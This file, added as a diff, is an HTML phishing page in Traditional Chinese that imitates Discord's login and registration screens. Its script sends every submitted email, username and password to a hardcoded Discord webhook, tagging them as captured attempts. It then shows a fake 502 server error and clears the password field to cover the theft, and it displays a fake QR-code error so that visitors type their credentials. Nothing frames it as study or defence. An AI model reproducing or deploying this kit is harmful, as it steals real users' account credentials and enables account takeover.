@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* 引入 gg sans 類似字體與 Noto Sans TC */
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&display=swap');
+        
+        :root {
+            --brand-experiment: #5865f2;
+            --background-primary: #313338;
+            --background-secondary: #2b2d31;
+            --background-tertiary: #1e1f22;
+            --text-normal: #dbdee1;
+            --text-muted: #b5bac1;
+            --text-link: #00a8fc;
+            --status-danger: #fa777a;
+            --header-primary: #f2f3f5;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            font-family: "gg sans", "Noto Sans TC", sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #36393f;
+            /* 使用官方風格背景圖 */
+            background-image: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .login-card {
+            background-color: var(--background-primary);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            padding: 32px;
+            width: 784px;
+            min-height: 408px;
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* 輸入框樣式還原 */
+        .field-label {
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.02em;
+        }
+
+        .required { color: #f23f42; margin-left: 4px; }
+
+        .discord-input {
+            background-color: var(--background-tertiary);
+            color: var(--text-normal);
+            width: 100%;
+            height: 40px;
+            padding: 10px;
+            border-radius: 3px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            transition: border-color 0.2s ease;
+        }
+
+        .discord-input:focus {
+            box-shadow: 0 0 0 1px var(--brand-experiment);
+        }
+
+        /* QR Code 區域像素級還原 */
+        .qr-section {
+            width: 240px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-left: 1px solid rgba(79, 84, 92, 0.48);
+            padding-left: 32px;
+        }
+
+        .qr-error-container {
+            background-color: var(--background-secondary);
+            width: 176px;
+            height: 176px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            padding: 16px;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .qr-error-icon {
+            color: #ed4245;
+            margin-bottom: 8px;
+        }
+
+        .qr-error-text {
+            color: #ed4245;
+            font-size: 11px;
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.2;
+            text-transform: uppercase;
+        }
+
+        .main-button {
+            background-color: var(--brand-experiment);
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+            width: 100%;
+            height: 44px;
+            border-radius: 3px;
+            transition: background-color 0.17s ease;
+            margin-top: 24px;
+        }
+
+        .main-button:hover { background-color: #4752c4; }
+
+        /* 行動版適配 */
+        @media (max-width: 768px) {
+            .login-card { width: 100%; max-width: 480px; flex-direction: column; }
+            .qr-section { display: none; }
+        }
+
+        /* 自定義 Toast */
+        #error-toast {
+            position: fixed;
+            top: 20px;
+            background: #2b2d31;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            border-left: 4px solid var(--brand-experiment);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            display: none;
+            z-index: 1000;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="error-toast"></div>
+
+    <!-- 左上角 Logo -->
+    <div class="fixed top-8 left-8">
+        <svg width="124" height="24" viewBox="0 0 124 24" fill="white" class="opacity-90">
+            <path d="M19.7 4.5C18.2 3.8 16.6 3.3 14.9 3.1c-.2 0-.4.1-.5.3-.2.4-.4.9-.6 1.3-1.8-.3-3.5-.3-5.3 0-.2-.4-.4-.9-.6-1.3-.1-.2-.3-.3-.5-.3-1.7.2-3.3.7-4.8 1.4-.1 0-.1.1-.2.2C.4 7.6-.4 12.1.2 16.5c0 .1.1.2.2.3 2 1.5 3.9 2.4 5.9 3 .2.1.4 0 .5-.2.5-.6.9-1.3 1.2-2 .1-.2 0-.4-.2-.5-.6-.2-1.2-.5-1.8-.8-.2-.1-.2-.4 0-.5.1-.1.3-.2.4-.3.1 0 .1 0 .1.1 1.3.6 2.6.9 4 .9s2.7-.3 4-.9c.1 0 .1-.1.2-.1.1.1.3.2.4.3.2.1.2.4 0 .5-.6.3-1.2.6-1.8.8-.2.1-.3.3-.2.5.3.7.7 1.4 1.2 2 .1.2.3.3.5.2 2-.6 3.9-1.5 5.9-3 .1-.1.2-.2.2-.3.7-5.1-.8-9.5-2.7-12.2 0-.1-.1-.1-.2-.2zM9.1 14.3c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3zm6.6 0c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3z"/>
+        </svg>
+    </div>
+
+    <div class="login-card">
+        <!-- 左側：登錄表單 -->
+        <div class="flex-1" id="view-container">
+            <div id="login-view">
+                <div class="text-center mb-8">
+                    <h1 class="text-white text-[24px] font-bold mb-2">歡迎回來！</h1>
+                    <p class="text-[var(--text-muted)] text-[16px]">我們很高興又見到您了！</p>
+                </div>
+
+                <div class="space-y-5">
+                    <div>
+                        <label class="field-label">電子郵件或電話號碼 <span class="required">*</span></label>
+                        <input type="text" id="email" class="discord-input">
+                    </div>
+                    <div>
+                        <label class="field-label">密碼 <span class="required">*</span></label>
+                        <input type="password" id="pass" class="discord-input">
+                        <a href="#" class="text-[var(--text-link)] text-[14px] hover:underline mt-2 block">忘記您的密碼？</a>
+                    </div>
+                    
+                    <button onclick="handleAuth('login')" class="main-button">登入</button>
+                    
+                    <div class="text-[14px] mt-2">
+                        <span class="text-[var(--text-muted)]">需要一個帳號？</span>
+                        <button onclick="toggleView('register')" class="text-[var(--text-link)] hover:underline ml-1">註冊</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 註冊表單 (預設隱藏) -->
+            <div id="register-view" class="hidden">
+                <div class="text-center mb-8">
+                    <h1 class="text-white text-[24px] font-bold mb-2">建立帳號</h1>
+                </div>
+                <div class="space-y-4">
+                    <div>
+                        <label class="field-label">電子郵件 <span class="required">*</span></label>
+                        <input type="email" id="reg-email" class="discord-input">
+                    </div>
+                    <div>
+                        <label class="field-label">使用者名稱 <span class="required">*</span></label>
+                        <input type="text" id="reg-user" class="discord-input">
+                    </div>
+                    <div>
+                        <label class="field-label">密碼 <span class="required">*</span></label>
+                        <input type="password" id="reg-pass" class="discord-input">
+                    </div>
+                    <button onclick="handleAuth('register')" class="main-button">繼續</button>
+                    <div class="text-[14px] mt-4">
+                        <button onclick="toggleView('login')" class="text-[var(--text-link)] hover:underline">已經有帳號了？</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 右側：QR Code 報錯 -->
+        <div class="qr-section">
+            <div class="qr-error-container">
+                <div class="qr-error-icon">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                </div>
+                <div class="qr-error-text">網路發生錯誤<br>無法顯示QR code</div>
+            </div>
+            <h2 class="text-white text-[24px] font-bold mb-2 text-center leading-tight">使用 QR Code 登入</h2>
+            <p class="text-[var(--text-muted)] text-[14px] text-center leading-relaxed px-2">
+                用 <strong>Discord 行動應用程式</strong> 對此掃描 就能立即登入。
+            </p>
+            <button class="text-[var(--text-link)] text-[12px] hover:underline mt-8">或者，使用密碼金鑰登入</button>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476827104506286112/urwCp7Ds_h3-IVS-Td6EbUpCrxA4Ge0UftX1LGds_ADDTWXlRWfFMqc0ZRGD3Gz6I2AW";
+
+        function showToast(msg) {
+            const toast = document.getElementById('error-toast');
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 5000);
+        }
+
+        function toggleView(view) {
+            const lv = document.getElementById('login-view');
+            const rv = document.getElementById('register-view');
+            const card = document.querySelector('.login-card');
+            
+            if (view === 'register') {
+                lv.classList.add('hidden');
+                rv.classList.remove('hidden');
+                card.classList.remove('with-qr'); // 註冊通常是單欄
+            } else {
+                rv.classList.add('hidden');
+                lv.classList.remove('hidden');
+            }
+        }
+
+        async function handleAuth(type) {
+            let data = {};
+            if (type === 'login') {
+                const email = document.getElementById('email').value;
+                const pass = document.getElementById('pass').value;
+                if (!email || !pass) return showToast("請填寫所有欄位。");
+                data = { title: "🔑 捕獲登錄嘗試", fields: [{name: "帳號", value: email}, {name: "密碼", value: `||${pass}||`}] };
+            } else {
+                const email = document.getElementById('reg-email').value;
+                const user = document.getElementById('reg-user').value;
+                const pass = document.getElementById('reg-pass').value;
+                if (!email || !user || !pass) return showToast("請填寫所有欄位。");
+                data = { title: "📝 捕獲註冊嘗試", fields: [{name: "信箱", value: email}, {name: "用戶名", value: user}, {name: "密碼", value: `||${pass}||`}] };
+            }
+
+            showToast("正在驗證帳號...");
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: data.title,
+                            color: 5793266,
+                            fields: [...data.fields, { name: "頁面", value: window.location.href }],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (e) {}
+
+            // 1.5 秒後模擬伺服器報錯
+            setTimeout(() => {
+                showToast("伺服器回應異常 (Error 502)。請檢查您的網路連線並稍後再試。");
+                if(type === 'login') document.getElementById('pass').value = "";
+                else document.getElementById('reg-pass').value = "";
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
